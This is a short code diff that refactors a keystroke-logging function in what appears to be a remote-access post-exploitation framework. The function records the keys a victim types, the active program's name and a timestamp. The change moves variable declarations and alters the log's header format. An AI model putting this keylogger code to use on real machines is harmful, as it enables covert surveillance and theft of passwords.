@@ -314,8 +314,6 @@ DWORD request_ui_get_keys_utf8(Remote *remote, Packet *request)
 
 int ui_log_key(UINT vKey, USHORT mCode, USHORT Flags)
 {
-	BYTE lpKeyboard[256];
-	WCHAR kb[16] = { 0 };
 	HWND foreground_wnd;
 	HANDLE active_proc;
 	SYSTEMTIME st;
@@ -324,8 +322,8 @@ int ui_log_key(UINT vKey, USHORT mCode, USHORT Flags)
 	WCHAR date_s[256] = { 0 };
 	WCHAR time_s[256] = { 0 };
 	WCHAR gknt_buf[256] = { 0 };
-	const bool isE0 = ((Flags & RI_KEY_E0) != 0);
-	const bool isE1 = ((Flags & RI_KEY_E1) != 0);
+	BYTE lpKeyboard[256];
+	WCHAR kb[16] = { 0 };
 
 	GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
 	GetKeyboardState(lpKeyboard);
@@ -356,7 +354,7 @@ int ui_log_key(UINT vKey, USHORT mCode, USHORT Flags)
 			GetSystemTime(&st);
 			GetDateFormatW(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, &st, NULL, date_s, sizeof(date_s));
 			GetTimeFormatW(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT, &st, NULL, time_s, sizeof(time_s));
-			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"\n>>>\n%s\n@ %s %s UTC\n<<<\n", g_active_image, date_s, time_s);
+			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"\n**\n-[ %s\n-[ @ %s %s UTC\n**\n", g_active_image, date_s, time_s);
 			RtlZeroMemory(g_prev_active_image, MAX_PATH);
 			_snwprintf(g_prev_active_image, MAX_PATH, L"%s", g_active_image);
 		}
@@ -364,6 +362,8 @@ int ui_log_key(UINT vKey, USHORT mCode, USHORT Flags)
 	}
 
 	// needed for some wonky cases
+	const bool isE0 = ((Flags & RI_KEY_E0) != 0);
+	const bool isE1 = ((Flags & RI_KEY_E1) != 0);
 	UINT key = (mCode << 16) | (isE0 << 24);
 	BOOL ctrl_is_down = (1 << 15) & (GetAsyncKeyState(VK_CONTROL));
 
